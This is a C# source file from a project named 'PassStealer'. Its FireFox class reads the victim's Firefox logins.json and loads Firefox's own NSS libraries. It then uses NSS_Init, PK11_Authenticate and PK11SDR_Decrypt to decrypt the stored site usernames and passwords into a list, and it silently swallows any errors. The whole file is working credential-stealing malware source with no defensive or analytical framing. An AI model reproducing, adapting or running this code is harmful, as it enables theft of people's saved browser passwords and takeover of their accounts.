using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace PassStealer
{
	public class FireFox
	{
		public struct TSECItem
		{
			public int SECItemType;

			public int SECItemData;

			public int SECItemLen;
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string path);

		public delegate int DLLFunctionDelegate2(IntPtr arenaOpt, IntPtr outItemOpt, string inStr, int inLen);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate3();

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate4(long slot, bool loadCerts, long wincx);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref FireFox.TSECItem data, ref FireFox.TSECItem result, int cx);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate6();

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate7(long slot);

		private static string FFexe = Path.GetFireFoxExePath();

		private static string FFProfile = Path.GetFireFoxPath();

		private static List<string[]> data = new List<string[]>();

		private static IntPtr NSS3;

		public static void ParseJson()
		{
			string text = File.ReadAllText(FireFox.FFProfile + "\\logins.json");
			while (text.IndexOf("\"encryptedPassword\":\"") != -1)
			{
				text = text.Substring(text.IndexOf("\"hostname\":\"") + 12);
				string text2 = text;
				text2 = text2.Remove(text2.IndexOf("\",\"httpRealm\""));
				text = text.Substring(text.IndexOf("\"encryptedUsername\":\"") + 21);
				string text3 = text;
				text3 = text3.Remove(text3.IndexOf("\""));
				text = text.Substring(text.IndexOf("\"encryptedPassword\":\"") + 21);
				string text4 = text;
				text4 = text4.Remove(text4.IndexOf("\""));
				FireFox.data.Add(new string[]
				{
					text2,
					text3,
					text4
				});
			}
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string dllFilePath);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		public static long NSS_Init(string path)
		{
			FireFox.LoadLibrary(FireFox.FFexe + "mozglue.dll");
			FireFox.NSS3 = FireFox.LoadLibrary(FireFox.FFexe + "nss3.dll");
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "NSS_Init");
			FireFox.DLLFunctionDelegate dLLFunctionDelegate = (FireFox.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate));
			return dLLFunctionDelegate(path);
		}

		public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, string inStr, int inLen)
		{
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "NSSBase64_DecodeBuffer");
			FireFox.DLLFunctionDelegate2 dLLFunctionDelegate = (FireFox.DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate2));
			return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
		}

		public static long PK11_GetInternalKeySlot()
		{
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "PK11_GetInternalKeySlot");
			FireFox.DLLFunctionDelegate3 dLLFunctionDelegate = (FireFox.DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate3));
			return dLLFunctionDelegate();
		}

		public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "PK11_Authenticate");
			FireFox.DLLFunctionDelegate4 dLLFunctionDelegate = (FireFox.DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate4));
			return dLLFunctionDelegate(slot, loadCerts, wincx);
		}

		public static int PK11SDR_Decrypt(ref FireFox.TSECItem data, ref FireFox.TSECItem result, int cx)
		{
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "PK11SDR_Decrypt");
			FireFox.DLLFunctionDelegate5 dLLFunctionDelegate = (FireFox.DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate5));
			return dLLFunctionDelegate(ref data, ref result, cx);
		}

		public static int NSS_Shutdown()
		{
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "NSS_Shutdown");
			FireFox.DLLFunctionDelegate6 dLLFunctionDelegate = (FireFox.DLLFunctionDelegate6)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate6));
			return dLLFunctionDelegate();
		}

		public static int PK11_FreeSlot(long slot)
		{
			IntPtr procAddress = FireFox.GetProcAddress(FireFox.NSS3, "PK11_FreeSlot");
			FireFox.DLLFunctionDelegate7 dLLFunctionDelegate = (FireFox.DLLFunctionDelegate7)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FireFox.DLLFunctionDelegate7));
			return dLLFunctionDelegate(slot);
		}

		private static string decrypt(string S)
		{
			FireFox.TSECItem tSECItem = default(FireFox.TSECItem);
			FireFox.NSS_Init(FireFox.FFProfile);
			long num = FireFox.PK11_GetInternalKeySlot();
			if (num == 0L)
			{
				return string.Empty;
			}
			FireFox.PK11_Authenticate(num, true, 0L);
			int value = FireFox.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, S, S.Length);
			FireFox.TSECItem tSECItem2 = (FireFox.TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(FireFox.TSECItem));
			if (FireFox.PK11SDR_Decrypt(ref tSECItem2, ref tSECItem, 0) != 0)
			{
				return string.Empty;
			}
			if (tSECItem.SECItemLen != 0)
			{
				byte[] array = new byte[tSECItem.SECItemLen];
				Marshal.Copy(new IntPtr(tSECItem.SECItemData), array, 0, tSECItem.SECItemLen);
				return Encoding.ASCII.GetString(array);
			}
			return string.Empty;
		}

		public static void DecryptFirefox(List<string[]> general)
		{
			try
			{
				if (FireFox.FFexe != null && FireFox.FFProfile != null)
				{
					FireFox.ParseJson();
					int count = general.Count;
					string[] array = new string[4];
					array[0] = "########################";
					array[1] = FireFox.FFProfile;
					array[2] = "########################";
					general.Add(array);
					for (int i = 0; i < FireFox.data.Count; i++)
					{
						general.Add(new string[]
						{
							count + i + 1 + ")",
							FireFox.data[i][0],
							FireFox.decrypt(FireFox.data[i][1]),
							FireFox.decrypt(FireFox.data[i][2])
						});
					}
				}
			}
			catch
			{
			}
		}
	}
}
